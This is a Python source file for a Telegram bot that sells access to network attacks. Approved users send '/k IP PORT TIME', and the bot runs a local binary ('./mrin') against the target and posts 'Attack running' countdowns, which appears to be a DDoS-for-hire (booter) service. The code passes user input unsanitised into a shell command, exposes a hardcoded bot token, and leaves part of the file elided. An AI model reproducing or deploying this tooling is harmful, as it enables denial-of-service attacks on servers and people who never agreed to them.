import os
import telebot
import json
import requests
import logging
import time
from datetime import datetime, timedelta
import random
from subprocess import Popen
from threading import Thread, Lock
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7539022476:AAHz6HEujuVoyOyDIk50fqCN5mtjcyKHUwk'
FORWARD_CHANNEL_ID = -100
CHANNEL_ID = -100
error_channel_id = -100

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Timer management
active_timers = []
timer_lock = Lock()

# Local storage for user data
def load_user_data():
    try:
        with open('users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_data(users_data):
    with open('users.json', 'w') as f:
        json.dump(users_data, f)

users_data = load_user_data()

def update_user_plan(user_id, plan, valid_until):
    users_data[user_id] = {"plan": plan, "valid_until": valid_until}
    save_user_data(users_data)

def get_user_plan(user_id):
    return users_data.get(str(user_id), None)

async def timer_watcher():
    while True:
        await asyncio.sleep(1)
        try:
            current_time = time.time()
            with timer_lock:
                to_remove = []
                
                for timer in active_timers:
                    if timer['end_time'] <= current_time:
                        try:
                            await bot.edit_message_text(
                                "Attack completed ✅",
                                timer['chat_id'],
                                timer['message_id'],
                                parse_mode='Markdown'
                            )
                        except Exception as e:
                            logging.error(f"Error editing completion message: {e}")
                        to_remove.append(timer)
                    else:
                        remaining = int(timer['end_time'] - current_time)
                        try:
                            await bot.edit_message_text(
                                f"*Attack running... 💥*\n\nHost: {timer['target_ip']}\nPort: {timer['target_port']}\nRemaining: {remaining}s",
                                timer['chat_id'],
                                timer['message_id'],
                                parse_mode='Markdown'
                            )
                        except Exception as e:
                            logging.error(f"Error updating timer: {e}")

                # Remove completed timers
                for timer in to_remove:
                    active_timers.remove(timer)
                    
        except Exception as e:
            logging.error(f"Timer watcher error: {e}")

async def run_attack_command_async(target_ip, target_port, duration):
    # Modified command line (removed extra 60 parameter)
    process = await asyncio.create_subprocess_shell(f"./mrin {target_ip} {target_port} {duration}")
    await process.communicate()

@bot.message_handler(commands=['k'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        # Permission check
        if user_id != 1695959688:
            user_data = get_user_plan(user_id)
            if not user_data or user_data['plan'] == 0:
                bot.send_message(chat_id, "*You are not approved to use this bot.*", parse_mode='Markdown')
                return

        # Parse command
        args = message.text.split()
        if len(args) != 4:
            bot.send_message(chat_id, "*Format: /k IP PORT TIME*", parse_mode='Markdown')
            return

        target_ip = args[1]
        try:
            target_port = int(args[2])
            duration = int(args[3])
        except ValueError:
            bot.send_message(chat_id, "*Invalid port/time format*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked*", parse_mode='Markdown')
            return

        # Start attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        
        # Send initial message and store timer
        msg = bot.send_message(
            chat_id,
            f"*Attack started 💥*\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}s\n\nRemaining: {duration}s",
            parse_mode='Markdown'
        )
        
        with timer_lock:
            active_timers.append({
                'chat_id': chat_id,
                'message_id': msg.message_id,
                'end_time': time.time() + duration,
                'target_ip': target_ip,
                'target_port': target_port,
                'duration': duration
            })

    except Exception as e:
        logging.error(f"Attack command error: {e}")
        bot.send_message(chat_id, "*Error processing request*", parse_mode='Markdown')

# [Keep all other functions unchanged below]
# ... (rest of your original code including approve/disapprove, start, etc.)

async def main_loop():
    await asyncio.gather(
        timer_watcher(),
    )

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_loop())

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    
    logging.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(10)